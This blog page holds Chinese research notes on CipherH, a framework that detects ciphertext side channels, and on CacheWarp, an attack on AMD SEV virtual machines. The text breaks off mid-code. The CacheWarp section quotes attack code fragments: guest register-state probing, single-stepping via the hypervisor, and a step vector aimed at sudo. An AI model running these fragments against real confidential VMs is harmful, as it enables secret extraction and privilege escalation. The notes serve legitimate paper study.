      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>22 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CipherH"><a href="#CipherH" class="headerlink" title="CipherH"></a>CipherH</h1><p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/tree/master">Sen-Deng&#x2F;CipherH at master (github.com)</a></p>
<blockquote>
<p>Recent works have illustrated the feasibility of launching ciphertext side-channel attacks against cryptographic libraries using the aforementioned threat model [33]. However, they primarily target manually identified program vulnerabilities. This work presents CIPHERH, a thorough and fully automated framework for identifying such vulnerabilities in production cryptographic libraries.  </p>
</blockquote>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p><strong>CIPHERLEAKS: Breaking Constant-time Cryptography on AMD SEV via the Ciphertext Side Channel</strong></p>
<p><strong>A Systematic Look at Ciphertext Side Channels</strong></p>
<p>VMSA page 物理地址不变  XEX</p>
<ol>
<li>建立寄存器密文&lt;-&gt;明文的映射 ：控制OVMF 的一个PEIM  触发NAE VC handler 同时观察rax明文和密文   需要可读</li>
<li>得到需要攻击的代码页地址：清空所有page 的P bit  NPF的errorcode会知道是否是代码页 再根据寄存器是否变化判断是否是目标代码页</li>
<li>以Open SSL rsa为例，bn_get_bits5的NPF可以正好从rax读到key的5bit 循环可以得到整个key</li>
</ol>
<p>缓解：</p>
<ol>
<li>减少会触发NAE导致建立映射的函数 但是治标不治本</li>
<li>函数返回值rax高位加随机数</li>
<li>用栈传递返回值或者其他寄存器</li>
<li>函数不在一个新的page开始</li>
</ol>
<p>光防VMSA没用 任意memory都可以观察</p>
<p>constant time swap可以防一些microarchitecture的side channel攻击 但是防不了比较密文</p>
<p>例如nginx  先发http请求 触发 然后清空Pbit触发NPF  然后用single-step技术</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>硬件防开销大</p>
<p>cipherH 软件框架 为了让加密库开发者写完代码以后自己检查一遍</p>
<blockquote>
<p>As will be introduced in §5, CIPHERH explores a hybrid approach by using dynamic taint analysis (which is scalable and rapid) to collect functions tainted on an execution trace. Then, it performs static symbolic execution toward each tainted function, covering paths that are not on the dynamic trace.  </p>
</blockquote>
<p><strong>设计并不是很难 主要用了两个工具  2.3k代码</strong></p>
<p>key是taint 访问的过程中 不可以有一块内存可以推断key是否变化 因为都是bit操作 或者n-bit操作 减少了熵</p>
<ul>
<li>DFSan  llvm</li>
<li>angr SSP’16 二进制文件反编译  得到更多的寄存器访存信息  <a target="_blank" rel="noopener" href="https://trevorsaudi.com/posts/symbolic_execution_angr_part1/">Symbolic Execution with Angr - part 1 · Trevor Saudi</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/ase18/ase18-paper_springer.pdf">ase18-paper_springer.pdf (usenix.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://clang.llvm.org/docs/DataFlowSanitizer.html">DataFlowSanitizer — Clang 19.0.0git documentation (llvm.org)</a></p>
<p>编译优化等级开相同  根据函数名可以方便找到对应关系</p>
<p>但还是有些信息不匹配的  所以第二阶段用保守方法处理</p>
<h3 id="taint-analysis"><a href="#taint-analysis" class="headerlink" title="taint analysis"></a>taint analysis</h3><p>DFSan需要用他的API加到代码里 然后编译</p>
<p>追踪数学运算、逻辑、内存访问 包括implicit</p>
<p>手动识别secret并调API  hook每个函数调用 内存访问</p>
<p>实际上secret就是RSA的一个私钥  传入最外层的函数之后 之后全可以通过自动分析得到 并不需要对算法库有修改</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/src/apps/wolfssl_case_study/test.c">CipherH&#x2F;src&#x2F;apps&#x2F;wolfssl_case_study&#x2F;test.c at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>这个阶段输出一系列函数   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">get_digit_count:3</span><br><span class="line">mp_rand:65</span><br><span class="line">fp_invmod:1</span><br><span class="line">fp_div_2:1</span><br><span class="line">fp_exptmod:1</span><br><span class="line">_fp_exptmod_ct:33</span><br><span class="line">fp_montgomery_reduce:33</span><br><span class="line">wc_RsaUnPad_ex:67</span><br><span class="line">RsaUnPad:67</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/tainted_func.txt">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;tainted_func.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>猜测最后的结果记录了函数名和对应的taint位置 包括6个参数寄存器、返回值、从内存加载</p>
<ol>
<li>任何输入 都是taint的</li>
<li>返回值是taint</li>
<li>从memory load了taint data</li>
</ol>
<p>对密码学算法库来说不需要构造很多覆盖面广的input  很多input其实涉及到的逻辑都一样</p>
<p>不过其实筛掉大部分的function  然后留下function name和taint symbol name就可以了</p>
<h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p>符号执行阶段 从第一阶段拿到足够的信息以后 可以对每个function单独进行符号执行 if生成约束  然后根据taint信息生成一个表达式 求解</p>
<p>因为这边不加混淆 所以代码应该比较容易被逆向 比如$0x10(rsp) 就可以认为是同一个指针</p>
<p>syntactical equivalence   和angr现有的一样 保证效率</p>
<h4 id="intra"><a href="#intra" class="headerlink" title="intra"></a>intra</h4><p>遇到if 加约束</p>
<p>遇到call 直接用symbol  根据taint analysis的结果可以知道这里的symbol用普通的s还是taint的k</p>
<p>M 中的元组a,v 表示symbol v写到地址a</p>
<p>W中的元组a,v,i表示指令i把数据v写到地址a</p>
<ol>
<li>检查v是否包含key</li>
<li>是否存在a1&#x3D;a 且v1也包含key</li>
<li>放入Eq4看看是否可满足 (带上之前if导致的一系列条件)</li>
<li>SMT solver返回是否可满足 并给出例子 留给user后续手动分析</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/src/run.py">CipherH&#x2F;src&#x2F;run.py at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>hook了每次内存读写的操作  回调的时候有当前所有的状态 包括这句内存读写操作的AST</p>
<p>AST中包括symbol的表达式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">initial_state.inspect.b(<span class="string">&#x27;instruction&#x27;</span>, action=track_instr)</span><br><span class="line">initial_state.inspect.b(<span class="string">&#x27;mem_write&#x27;</span>, when=angr.BP_BEFORE,action=track_write_mem_before)</span><br><span class="line">initial_state.inspect.b(<span class="string">&#x27;mem_read&#x27;</span>, when=angr.BP_BEFORE, action=track_read_mem_before)</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> fun_name <span class="keyword">in</span> tainted_func:</span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">128</span> == <span class="number">128</span>:</span><br><span class="line">    initial_state.regs.rdi = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">64</span> == <span class="number">64</span>:</span><br><span class="line">    initial_state.regs.rsi = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">32</span> == <span class="number">32</span>:</span><br><span class="line">    initial_state.regs.rdx = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>)           </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">16</span> == <span class="number">16</span>:</span><br><span class="line"></span><br><span class="line">    initial_state.regs.rcx = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">8</span> == <span class="number">8</span>:</span><br><span class="line">    initial_state.regs.r8 = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tainted_func[fun_name] &amp; <span class="number">4</span> == <span class="number">4</span>:</span><br><span class="line">    initial_state.regs.r9 = initial_state.solver.BVS(<span class="string">&quot;k&quot;</span>, <span class="number">64</span>) </span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">len</span>(state.ch.chain)//<span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> l &gt;= <span class="number">1</span>:</span><br><span class="line">    l = l - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> state.ch.chain[<span class="number">4</span>*l+<span class="number">1</span>] <span class="keyword">is</span> state.inspect.mem_write_address:</span><br></pre></td></tr></table></figure>

<p>四个一组 循环找 所以chain就是论文中的W和M</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/level5uiharu/p/16932453.html">欢迎回来(。・∀・)ノ (cnblogs.com)</a></p>
<p>这里chain和expr应该都是AST key要么在arg0要么在arg1 </p>
<p>第一个条件是判断是否相等 第二个条件是判断换一个变量是否可以不等(把key换成另一个symbol)</p>
<p>这里虽然名字都是sol 但实际上都是两个不同的symbol 比如sol_22 sol_23</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  temp1 == <span class="string">&#x27;__add__&#x27;</span> <span class="keyword">and</span> temp2 ==  <span class="string">&#x27;__add__&#x27;</span> :</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;k&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>].args[<span class="number">0</span>]):</span><br><span class="line">    	temp3 = state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>] - state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>].args[<span class="number">0</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	temp3 = state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>] - state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>].args[<span class="number">1</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))                                       </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;k&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(state.inspect.mem_write_expr.args[<span class="number">0</span>]):</span><br><span class="line">    	temp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class="number">0</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	temp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class="number">1</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">if</span> state.solver.satisfiable(extra_constraints=[state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>] == state.inspect.mem_write_expr, temp3 != temp4]):</span><br><span class="line">    	<span class="built_in">print</span>(<span class="string">&quot;bug in &#123;&#125; for &#123;:x&#125; and &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(fun_name, state.ch.chain[<span class="number">4</span>*l], state.inspect.instruction), file=f_result)                     </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里等号的含义是，是否存在某一组symbol的组合(k1 k2 k3 k4) 使得取值可以相等(64bit整数)</p>
<p>W1 W2应该表示连续两次读 (i变i+1 或f前和f后)</p>
<p><strong>ch.chain和inspect.mem_write_expr</strong>是什么？  好像后者就是前者的4l+2?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">state.ch.chain = state.ch.chain + [state.inspect.instruction]</span><br><span class="line">state.ch.chain = state.ch.chain + [state.inspect.mem_write_address]</span><br><span class="line">a = <span class="built_in">str</span>(state.inspect.mem_write_expr)</span><br><span class="line">b = a[<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">state.ch.chain = state.ch.chain + [b]</span><br><span class="line">state.ch.chain = state.ch.chain + [state.inspect.mem_write_expr]</span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/symbolic_exec/result.txt">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;symbolic_exec&#x2F;result.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>这个地址应该就是二进制文件里面的地址 非常精确 供之后手动分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bug in fp_rshb for 41cc2a and 41cc2a</span><br><span class="line">bug in fp_rshb for 41cc63 and 41cc63</span><br><span class="line"></span><br><span class="line">bug in _fp_exptmod_ct for 41ee25 and 41ee5c</span><br><span class="line">bug in _fp_exptmod_ct for 41ee4b and 41ee4b</span><br><span class="line">bug in _fp_exptmod_ct for 41ee5c and 41ee5c</span><br><span class="line">bug in _fp_exptmod_ct for 41f04b and 41f04b</span><br></pre></td></tr></table></figure>

<h4 id="inter"><a href="#inter" class="headerlink" title="inter"></a>inter</h4><p>同一块内存会在函数调用间被写</p>
<ul>
<li>频繁调用</li>
<li>callee至少一个参数是tainted</li>
</ul>
<p>没有加约束求解 所以可能带来false positives</p>
<blockquote>
<p>In all, during our intra-procedural analysis, we use symbolic execution to traverse each path of a tainted function Fc. During the traversal, we search for every encountered callee function and decide if any callee function F meets the aforementioned patterns. If so, we will proceed further to launch intra-procedural symbolic execution toward F, and decide if F has memory write instructions whose content is derived from its tainted parameters. If so, we would conclude that F enables ciphertext side channels, assuming multiple runs of F from Fc write secrets into the same memory address.  </p>
</blockquote>
<p>只要callee F用taint 写了内存就认为会带来side channel</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/05/04/papers/CacheWarp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/04/papers/CacheWarp/" class="post-title-link" itemprop="url">CacheWarp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-05-04 15:40:39 / Modified: 15:41:51" itemprop="dateCreated datePublished" datetime="2024-05-04T15:40:39+08:00">2024-05-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>4.3k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>16 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CacheWarp"><a href="#CacheWarp" class="headerlink" title="CacheWarp"></a>CacheWarp</h1><p>snp用的是<a target="_blank" rel="noopener" href="https://github.com/sev-step/sev-step">sev-step&#x2F;sev-step: This repo tracks a compatible state of all sev step components and contains script to easily install everything required to setup a sev vm (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/blob/main/kernel-patch/kernel.patch">CacheWarp&#x2F;kernel-patch&#x2F;kernel.patch at main · cispa&#x2F;CacheWarp (github.com)</a></p>
<p>SEV_STEP_FLAG_BASE_PFN   sev_step_page_va  和user通信地址</p>
<p>intr_interception 核心逻辑</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/blob/main/userspace-controller/cachewarp/cachewarp.c">CacheWarp&#x2F;userspace-controller&#x2F;cachewarp&#x2F;cachewarp.c at main · cispa&#x2F;CacheWarp (github.com)</a></p>
<p>sev_step_kernel_sync_addr_p 和step框架通信</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sev_step_kernel_sync_addr_p = libtea_map_physical_address_range(instance, KERNEL_SYNC_PA, <span class="number">4096</span>, PROT_READ | PROT_WRITE, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">memset</span>(sev_step_kernel_sync_addr_p, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> vec[<span class="number">100</span>] = &#123;<span class="number">44</span>, <span class="number">0</span>,<span class="number">8</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>, <span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>, <span class="number">0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> ,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x201</span>, <span class="number">1</span>,<span class="number">0x101</span>,<span class="number">0x101</span>,<span class="number">3</span>,<span class="number">0x11</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x5</span>, <span class="number">1</span>,<span class="number">0x11</span>,<span class="number">0x21</span>,<span class="number">0x20</span>,<span class="number">1</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>, <span class="number">0x21</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x3000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= vec[<span class="number">0</span>]; i++)</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;movw %1, (%0)\n\t&quot;</span>:: <span class="string">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p+<span class="number">16</span>+<span class="number">2</span>*i),<span class="string">&quot;r&quot;</span>(vec[i]):)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>vec攻击向量 和sudo的binary有关</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/tree/main/sudo">CacheWarp&#x2F;sudo at main · cispa&#x2F;CacheWarp (github.com)</a></p>
<p>用到libtea 是usenix security22提供的一套框架 不用自己写一大堆难懂的汇编 并且屏蔽掉平台的差异</p>
<p><a target="_blank" rel="noopener" href="https://github.com/libtea/frameworks/blob/master/libtea/src/libtea_common.c">frameworks&#x2F;libtea&#x2F;src&#x2F;libtea_common.c at master · libtea&#x2F;frameworks (github.com)</a></p>
<p>vec记录了一串数值 是step指令的序列</p>
<p>vmsa layout 记录在手册中</p>
<p><a target="_blank" rel="noopener" href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf</a></p>
<p>Table B-4. VMSA Layout, State Save Area for SEV-ES</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">vmsa_paddr = svm-&gt;vmcb-&gt;control.vmsa_pa;</span><br><span class="line"></span><br><span class="line">rsp = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x1d8</span>);</span><br><span class="line">rbp = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x328</span>);</span><br><span class="line">rax = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x1f8</span>);</span><br><span class="line">rcx = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x308</span>);</span><br><span class="line">rdx_rbx = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x310</span>);</span><br><span class="line">rsi_rdi = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x330</span>);</span><br><span class="line">r8_r9   = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x340</span>);</span><br><span class="line">r10_r11 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x350</span>);</span><br><span class="line">r12_r13 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x360</span>);</span><br><span class="line">r14_r15 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x370</span>);</span><br><span class="line">xmm = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x470</span>);</span><br><span class="line">ymm = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x570</span>);</span><br><span class="line">cs  = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x10</span>);</span><br><span class="line">ss  = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x20</span>);</span><br><span class="line">reg_vector = ((last_vmsa_rsp != rsp) &lt;&lt; <span class="number">0</span>) + ((last_vmsa_rbp != rbp) &lt;&lt; <span class="number">1</span>) + \</span><br><span class="line">						((last_vmsa_rax != rax) &lt;&lt; <span class="number">2</span>) 		   + ((last_vmsa_rcx != rcx) &lt;&lt; <span class="number">3</span>) + \</span><br><span class="line">						((last_vmsa_rdx_rbx != rdx_rbx) &lt;&lt; <span class="number">4</span>)  + ((last_vmsa_rsi_rdi != rsi_rdi) &lt;&lt; <span class="number">5</span>) + \</span><br><span class="line">						((last_vmsa_r8_r9 != r8_r9) &lt;&lt; <span class="number">6</span>) 	   + ((last_vmsa_r10_r11 != r10_r11) &lt;&lt; <span class="number">7</span>) + \</span><br><span class="line">						((last_vmsa_r12_r13 != r12_r13) &lt;&lt; <span class="number">8</span>)  + ((last_vmsa_r14_r15 != r14_r15) &lt;&lt; <span class="number">9</span>) + \</span><br><span class="line">						((last_vmsa_xmm != xmm) &lt;&lt; <span class="number">10</span>) 		   + ((last_vmsa_ymm != ymm) &lt;&lt; <span class="number">11</span>) + \</span><br><span class="line">						((last_vmsa_cs != cs) &lt;&lt; <span class="number">12</span>) 		   + ((last_vmsa_ss != ss) &lt;&lt; <span class="number">13</span>);</span><br><span class="line"><span class="keyword">if</span> (reg_vector != *((<span class="keyword">volatile</span> u16 *)(sev_step_page_va + PATH_OFFSET + path_index*<span class="number">2</span>))) &#123;</span><br><span class="line">						find_target = <span class="literal">false</span>;</span><br><span class="line">						printk(<span class="string">&quot;dismatch %dth Instr! the vector is 0x%x\n&quot;</span>, path_index, reg_vector);</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>









<p>user 先设置flag  kvm把所有页表present bit设为0 guest触发NPF</p>
<p>kvm拿到gpa 设置APIC</p>
<p>小于阈值 0step 大于阈值 &gt;&#x3D;1step</p>
<p>观察RIP看是0还是非0</p>
<p>snp增加了freshness 寄存器一样密文也会变 可以用sev-step的performance counter</p>
<p>由于vmsa的cache 导致每次context switch时间不稳定 因此用MTRR标记为不可缓存 并且用wbinvd解决AMD CPU可能stale的问题</p>
<p>NPF的作用是啥</p>
<blockquote>
<p>To ensure consistent conditions for every stepping, the hypervisor always clears the present bit of the last fault page when handling the APIC timer interrupt, i.e., an NPF is always triggered before the next APIC interrupt.  </p>
</blockquote>
<p>为了控制变量 保证时间稳定？感觉几乎没有用</p>
<ol>
<li>run的汇编每次固定apic timer 可以step</li>
<li>sev-step没有提到page fault</li>
</ol>
<p>是否只是拿个gpa 方便找pattern？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted, (u32*)(APIC_BASE + APIC_TMICT), apic_interval, wbnoinvd);</span><br><span class="line">SYM_FUNC_START(__svm_sev_es_vcpu_run)</span><br><span class="line">    movl %_ASM_ARG4L, (%_ASM_ARG3)</span><br></pre></td></tr></table></figure>

<p>攻击触发点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">ctrl_thread</span><span class="params">(<span class="type">void</span>* dummy)</span> &#123; </span><br><span class="line">	</span><br><span class="line">	pin_to_core(ASSIST_CORE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// hook kvm_exit_handler in the kernel </span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;movq %1, (%0)\n&quot;</span>::<span class="string">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p),<span class="string">&quot;r&quot;</span>(flag):)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Wait until the attack finishes */</span></span><br><span class="line">	<span class="keyword">while</span> (*(<span class="type">uint32_t</span>*)(sev_step_kernel_sync_addr_p)) &#123;sched_yield();&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">intr_interception</span><br><span class="line">    <span class="comment">/* Start */</span></span><br><span class="line">    <span class="keyword">if</span> (zero_stepping_time == <span class="number">0</span> &amp;&amp; non_zero_stepping_time == <span class="number">0</span>) &#123;</span><br><span class="line">        kvm_unpre_all(vcpu-&gt;kvm, svm-&gt;vmcb-&gt;control.asid);</span><br><span class="line">        svm_flush_tlb_current(vcpu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark VMSA into UC will make `VMRUN` updates all vmsa state in cache */</span></span><br><span class="line">        <span class="keyword">if</span> (uc_vmsa) &#123;</span><br><span class="line">            mtrr_uc_page(vmsa_paddr, <span class="number">3</span>);</span><br><span class="line">        